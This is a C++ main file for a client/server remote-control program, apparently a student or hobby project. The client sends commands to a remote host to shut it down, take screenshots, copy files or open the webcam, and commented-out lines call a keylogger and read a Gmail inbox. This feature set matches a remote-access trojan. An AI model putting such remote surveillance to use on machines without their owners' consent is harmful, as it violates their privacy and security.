#include "client_socket.h"
#include "server_socket.h"
// #include "GmailClient.h"
#include <iostream>

int main(int argc, char* argv[]) {

    // if (argc == 2 && std::string(argv[1]) == "server") {
    //     // Start server
    //     Server server(8083);
    //     if (server.start()) {
    //         server.listenForConnections();  // Synchronously listen for connections
    //     }
    // } else if (argc == 2 && std::string(argv[1]) == "client") {
    //     // Start client
    //     Client client("10.123.0.76", 8083);
    //     if (client.connectToServer()) {
    //         // client.sendShutdownRequest();
    //         client.sendKeyloggerRequest();
    //     }
        
    // } else {
    //     std::cerr << "Usage: " << argv[0] << " [server | client]" << std::endl;
    // }


    if (std::string(argv[1]) == "server") {
        // Start server
        Server server(54000);
        if (server.start()) {
            server.listenForConnections();  // Synchronously listen for connections
        }
    } else if (std::string(argv[1]) == "client") {
        // Start client
        Client client(std::string(argv[2]), 54000);
        if (client.connectToServer()) {
            if (std::string(argv[3]) == "shutdown") client.sendShutdownRequest();
            if (std::string(argv[3]) == "screenshot") client.sendScreenshotRequest();
            if (std::string(argv[3]) == "copyfile") client.sendFileCopyRequest(std::string(argv[4]), std::string(argv[5]));
            if (std::string(argv[3]) == "openwebcam") client.sendWebcamRequest();
            // for (int i = 0; i < 2000000000; i++){}
            // client.sendCloseWebcamRequest();
            // client.sendStartWebcamRequest();
            // client.sendStopWebcamRequest();
        }
    } else {
        std::cerr << "Usage: " << argv[0] << " [server | client]" << std::endl;
    }
    // GmailClient client("credential.json");
    // client.renewAccessToken();
    // client.listUnreadEmail();
    // client.writeAccessToken("credential.json");
    return 0;
}